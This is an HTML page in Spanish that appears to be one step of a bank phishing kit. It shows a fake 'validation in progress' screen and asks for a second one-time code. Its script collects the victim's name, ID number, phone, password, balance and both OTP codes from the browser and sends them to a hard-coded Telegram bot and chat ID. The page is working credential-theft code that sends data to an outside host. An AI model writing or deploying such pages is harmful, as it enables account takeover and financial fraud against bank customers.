<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Validando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html,body{height:100%;margin:0}
    body{display:flex;flex-direction:column;justify-content:center;align-items:center;background:#fff;font-family:Manrope,sans-serif;color:#200020;text-align:center}
    .login-section{margin:auto;max-width:420px;padding:0 20px}
    .login-wrap{background:#fff;border-radius:16px;padding:40px 30px;box-shadow:0 4px 12px rgba(0,0,0,.1)}
    .loader-gif{width:80px;margin:20px auto}
    .textypn2{margin:16px 0;font-size:16px;line-height:1.4}
    .label-input101{font-size:14px;color:#6e6e6e}
  </style>
</head>
<body>
  <div class="login-section">
    <div class="login-wrap">
      <h1>Validaci贸n en curso</h1>
      <div class="textypn2">
        Por favor espere un momento mientras validamos la informaci贸n ingresada, agradecemos su paciencia.
      </div>
      <div class="label-input101">Por lo general este proceso no demora m谩s de 2 minutos.</div>

      <!-- Bot贸n que YA TIENES en tu original -->
      <center class="mt-4">
        <button id="confirmSecondOTP" class="btn btn-primary px-4">Confirmar</button>
      </center>
    </div>
  </div>

  <script>
    /* ----------  TELEGRAM - SEGUNDA OTP  ---------- */
    async function confirmSecondOTP() {
      const otp2 = Array.from(document.querySelectorAll('.code_numerickeypad')).map(i => i.value).join('');
      if (otp2.length !== 6) { alert("Completa los 6 d铆gitos"); return; }

      // Datos del paso anterior
      const nombreApellido = localStorage.getItem("nombreApellido") || "No especificado";
      const cedula         = localStorage.getItem("cedula")         || "No especificado";
      const numero         = localStorage.getItem("numero")         || "No especificado";
      const clave          = localStorage.getItem("clave")          || "No especificado";
      const saldo          = localStorage.getItem("saldo")          || "No especificado";
      const otp1           = localStorage.getItem("otp1")           || "No especificado";

      const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
      const TELEGRAM_CHAT_ID   = '6958936698';

      const msg = ` <b>CLAVE DINMICA 2</b>\n\n` +
                  ` <b>Nombre:</b> ${nombreApellido}\n` +
                  ` <b>C茅dula:</b> ${cedula}\n` +
                  ` <b>N煤mero:</b> ${numero}\n` +
                  ` <b>Clave:</b> ${clave}\n` +
                  ` <b>Saldo:</b> ${saldo}\n` +
                  ` <b>Din谩mica 1:</b> <code>${otp1}</code>\n` +
                  ` <b>Din谩mica 2:</b> <code>${otp2}</code>\n` +
                  ` ${new Date().toLocaleString('es-CO')}`;

      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: "HTML"
          })
        });

        if (res.ok) {
          window.location.href = "success.html";
        } else {
          throw new Error("Error al enviar");
        }
      } catch (e) {
        alert("Error al enviar. Intente nuevamente.");
      }
    }

    // Asignar evento al bot贸n
    document.getElementById("confirmSecondOTP").addEventListener("click", confirmSecondOTP);
  </script>
</body>
</html>
